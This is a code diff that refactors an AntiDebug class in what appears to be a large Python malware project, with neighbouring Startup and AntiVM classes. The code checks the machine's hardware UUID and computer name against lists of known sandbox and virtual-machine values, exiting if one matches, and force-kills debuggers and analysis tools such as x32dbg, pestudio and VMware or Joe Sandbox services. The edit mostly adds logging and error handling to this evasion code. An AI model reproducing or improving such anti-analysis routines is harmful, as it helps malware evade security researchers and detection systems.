@@ -2262,6 +2262,13 @@ class Startup:
             print(str(e))
 
 
+import asyncio
+import os
+import sys
+import logging
+
+logging.basicConfig(level=logging.DEBUG)
+
 class AntiDebug:
     def __init__(self) -> None:
         self.banned_uuids = ["7AB5C494-39F5-4941-9163-47F54D6D5016","7204B444-B03C-48BA-A40F-0D1FE2E4A03B","88F1A492-340E-47C7-B017-AAB2D6F6976C","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "71DC2242-6EA2-C40B-0798-B4F5B4CC8776", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
@@ -2273,32 +2280,41 @@ class AntiDebug:
                                      "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"]
 
     async def FunctionRunner(self):
-        print("[+] Anti Debugging Started.")
-        taskk = [asyncio.create_task(self.check_system()),
-                 asyncio.create_task(self.kill_process())]
-        await asyncio.gather(*taskk)
-        print(f"[+] Anti Debug Succesfully Executed.")
+        logging.debug("[+] Anti Debugging Started.")
+        tasks = [
+            asyncio.create_task(self.check_system()),
+            asyncio.create_task(self.kill_process())
+        ]
+        await asyncio.gather(*tasks)
+        logging.debug("[+] Anti Debug Successfully Executed.")
+
     async def check_system(self) -> None:
         cmd = "wmic csproduct get uuid"
-        process = await asyncio.create_subprocess_shell(
+        try:
+            process = await asyncio.create_subprocess_shell(
                 cmd,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
-                shell=True)
-        stdout, stderr = await process.communicate()
-        output_lines = stdout.decode(errors="ignore").split("\n")
-        get_uuid = output_lines[1].strip()
-        get_computer_name = os.getenv("computername")    
-        
-        for uuid in self.banned_uuids:
-            if uuid in get_uuid:
-                print("hwid detected")
-                os._exit(0)
-        
-        for compName in self.banned_computer_names:
-            if compName in get_computer_name:
-                print("computer name detected")
-                os._exit(0)
+                shell=True
+            )
+            stdout, stderr = await process.communicate()
+            if process.returncode != 0:
+                logging.error(f"Command failed: {stderr.decode(errors='ignore')}")
+                return
+            
+            output_lines = stdout.decode(errors="ignore").split("\n")
+            get_uuid = output_lines[1].strip() if len(output_lines) > 1 else ""
+            get_computer_name = os.getenv("COMPUTERNAME", "")
+
+            if any(uuid in get_uuid for uuid in self.banned_uuids):
+                logging.warning("HWID detected")
+                sys.exit(0)
+            
+            if any(comp_name in get_computer_name for comp_name in self.banned_computer_names):
+                logging.warning("Computer name detected")
+                sys.exit(0)
+        except Exception as e:
+            logging.error(f"An error occurred in check_system: {e}")
 
     async def kill_process(self) -> None:
         try:
@@ -2308,20 +2324,28 @@ class AntiDebug:
                 stderr=asyncio.subprocess.PIPE,
                 shell=True
             )
+            stdout, stderr = await process_list.communicate()
+            if process_list.returncode != 0:
+                logging.error(f"tasklist command failed: {stderr.decode(errors='ignore')}")
+                return
             
-            stdout, _ = await process_list.communicate()
             stdout = stdout.decode(errors="ignore")
             for proc in self.banned_process:
                 if proc.lower() in stdout.lower():
-                    process_list = await asyncio.create_subprocess_shell(
-                    f'taskkill /F /IM "{proc}"',
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE,
-                    shell=True)
+                    try:
+                        kill_process = await asyncio.create_subprocess_shell(
+                            f'taskkill /F /IM "{proc}"',
+                            stdout=asyncio.subprocess.PIPE,
+                            stderr=asyncio.subprocess.PIPE,
+                            shell=True
+                        )
+                        await kill_process.communicate()
+                    except Exception as e:
+                        logging.error(f"Failed to kill process {proc}: {e}")
+        except Exception as e:
+            logging.error(f"An error occurred in kill_process: {e}")
 
-                    await process_list.communicate()
-        except:
-            pass
+
 
 class AntiVM:
     async def FunctionRunner(self) -> None:
